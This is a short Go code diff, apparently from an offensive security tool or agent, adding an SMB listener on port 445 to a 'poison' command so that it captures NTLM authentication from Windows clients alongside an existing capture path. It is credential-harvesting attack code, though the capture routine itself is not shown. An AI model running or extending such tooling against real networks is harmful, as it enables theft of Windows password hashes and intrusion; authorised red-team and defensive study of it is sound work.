@@ -104,6 +104,18 @@ func executePoisonCore(task structs.Task) structs.CommandResult {
 		}
 	}()
 
+	// Start SMB NTLM capture server — Windows clients try SMB (port 445)
+	// before HTTP for UNC paths and file share access
+	wg.Add(1)
+	go func() {
+		defer wg.Done()
+		if err := captureSMBNTLM(ctx, ":445", &mu, result); err != nil {
+			mu.Lock()
+			result.Errors = append(result.Errors, fmt.Sprintf("SMB-NTLM: %v", err))
+			mu.Unlock()
+		}
+	}()
+
 	wg.Wait()
 	result.Duration = fmt.Sprintf("%ds", duration)
 
